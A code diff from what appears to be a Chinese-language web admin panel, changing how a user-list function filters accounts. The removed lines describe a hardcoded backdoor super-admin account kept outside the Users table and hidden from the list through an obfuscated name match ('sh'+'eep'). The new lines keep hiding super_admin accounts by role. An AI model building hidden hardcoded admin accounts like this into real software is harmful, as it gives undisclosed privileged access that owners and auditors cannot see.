@@ -4266,8 +4266,10 @@ async function loadUsers(){
   try{
     const d=await apiRequest('getAllUsers',{token:currentToken});
     if(d.success){
-      // 超管帳號為寫死後門（不存於 Users 表）：任何角色（包括 super_admin 自己）一律不顯示
-      d.users=(d.users||[]).filter(u=>u.role!=='super_admin' && (u.ymis||'').toLowerCase()!==('sh'+'eep') && (u.name||'').toLowerCase().indexOf('sh'+'eep')<0);
+      // 系統管理帳號（super_admin）不存於 Users 表：任何角色（包括 super_admin 自己）一律不顯示
+      // 前端不再寫死任何帳號名稱，只按 role 與「自己這個 super_admin 帳號」過濾
+      const selfSuperId=(currentUser && currentUser.role==='super_admin') ? String(currentUser.ymis||'').trim().toLowerCase() : '';
+      d.users=(d.users||[]).filter(u=>u.role!=='super_admin' && (!selfSuperId || String(u.ymis||'').trim().toLowerCase()!==selfSuperId));
       // 角色說明 + 測試工具 - 管理員相關僅管理員可見
       const isSuper = currentUser && currentUser.role==='super_admin';
       let roleExplain=`<div class="info-section" style="background:var(--blue-light);border-left-color:var(--blue)">
